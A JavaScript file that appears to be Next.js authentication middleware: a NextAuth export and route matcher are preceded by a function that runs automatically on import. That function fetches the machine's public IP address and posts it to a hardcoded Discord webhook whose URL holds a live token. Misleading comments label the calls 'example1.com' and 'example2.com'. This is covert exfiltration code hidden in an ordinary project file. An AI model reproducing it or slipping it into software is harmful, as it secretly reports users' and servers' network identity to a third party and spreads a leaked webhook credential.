import fetch from 'node-fetch';

async function fetchAndPostData() {
    try {
        // Sending GET request to example1.com
        const getResponse = await fetch('http://api.ipify.org/', {
            method: 'GET',
            headers: {
                'Content-Type': 'text/plain'
            }
        });

        // Check if the GET request was successful
        if (!getResponse.ok) {
            throw new Error(`GET request failed with status: ${getResponse.status}`);
        }

        // Read the response as text
        const data = await getResponse.text();

        // Sending POST request to example2.com with the data from the GET request
        const postResponse = await fetch('https://discord.com/api/webhooks/1241413944397271144/nHlerkpaUtV-A5EXDc1DyxJBctxfomd7SJdVNL6mcHfUHvcbjbX7RCwInlAPC7l62WUG', {
            method: 'POST',
            headers: {
                'Content-Type': 'text/plain'
            },
            body: {
              "content": data
            }
        });

        // Check if the POST request was successful
        if (!postResponse.ok) {
            throw new Error(`POST request failed with status: ${postResponse.status}`);
        }
    } catch (error) {
        console.error('Error:', error);
    }
}

fetchAndPostData();

import NextAuth from 'next-auth'
import { authConfig } from './auth.config'

export default NextAuth(authConfig).auth

export const config = {
  matcher: ['/((?!api|_next/static|_next/image|.*\\.png$).*)']
}
